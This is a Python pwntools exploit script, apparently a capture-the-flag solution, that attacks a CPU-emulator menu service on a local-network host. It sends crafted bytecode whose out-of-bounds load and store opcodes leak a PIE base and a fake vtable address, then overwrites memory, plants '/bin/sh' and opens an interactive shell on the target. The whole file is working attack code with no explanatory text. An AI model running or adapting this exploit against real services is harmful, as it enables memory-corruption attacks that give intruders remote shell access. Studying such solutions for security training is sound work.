from pwn import *
import base64
'''
    case 0x3Eu:
          this->ra_ = CPU::next(this);

    case 0x32u:
          v28 = CPU::next16(this);
          CPU::write(this, v28, this->ra_);

    case 0x3Au:
          v29 = CPU::next16(this);
          this->ra_ = CPU::read(this, v29);
'''
s = remote('192.168.0.85',1234)
def set_obj(_id,_token,_content,_cmd):
  s.recvuntil('4. exit')
  s.send('1\n')
  s.recvuntil('id: ')
  s.send(_id)
  s.recvuntil('token: ')
  s.send(_token)
  s.recvuntil('objective: ')
  s.send(_content)
  s.recvuntil('algorithm: ')
  s.send(_cmd)
def target_obj(_id,_token):
  s.recvuntil('4. exit')
  s.send('2\n')
  s.recvuntil('id: ')
  s.send(_id)
  s.recvuntil('token: ')
  s.send(_token)
import random, string

def randomword(length):
   return ''.join(random.choice(string.lowercase) for i in range(length))
raw_input()
dat = '\x3e\x01\x32'
dat += struct.pack('<H',(-1-9)&0xffff)
for i in xrange(6):
  dat += '\x3a'
  dat += struct.pack('<H',(-24+i)&0xffff)
import os
name = randomword(4)
set_obj(name+'\n','1234\n','1234\n',base64.encodestring(dat))
s.recvuntil('[3a] ld a, (0xffe8)')
l = []
for i in xrange(6):
  l.append(s.recvuntil('F:')[-4-2:-4])
  print l
leak ='0x'
for i in xrange(6):
  leak += l[5-i]
pie = int(leak,16) - 0x20ed70
log.info('PIE : 0x%x'%pie)
name = randomword(4)
set_obj(name+'\n','1234\n',p64(pie+0x09AD9)+'\n',base64.encodestring('\x3e'))
target_obj(name+'\n','1234\n')
name = randomword(4)
dat = ""
for i in xrange(6):
  dat += '\x3a'+struct.pack('<H',(-8+i)&0xffff)
set_obj(name+'\n','1234\n','1234\n',base64.encodestring(dat))
s.recvuntil('[3a] ld a, (0xfff8)')
l = []
for i in xrange(6):
  l.append(s.recvuntil('F:')[-4-2:-4])
  print l
leak ='0x'
for i in xrange(6):
  leak += l[5-i]
magic = int(leak,16)
log.info('Fake Vtable : 0x%x'%magic)
l[0] = '48'
dat = ""
for i in xrange(6):
  dat += '\x3e'
  print l[i]
  dat += struct.pack('<B',int('0x'+l[i],16))
  dat += '\x32'
  dat += struct.pack('<H',(-24+i)&0xffff)
name = randomword(4)
set_obj(name+'\n','1234\n','1234\n',base64.encodestring(dat))
name = randomword(4)
set_obj(name+'\n','1234\n','/bin/sh'+'\n',base64.encodestring('\x3e'))
target_obj(name+'\n','1234\n')
bash = magic + 0x60
s.recvuntil('4. exit')
s.send('3\n')
s.recvuntil(':')
s.send(str(bash)+'\n')
s.interactive()
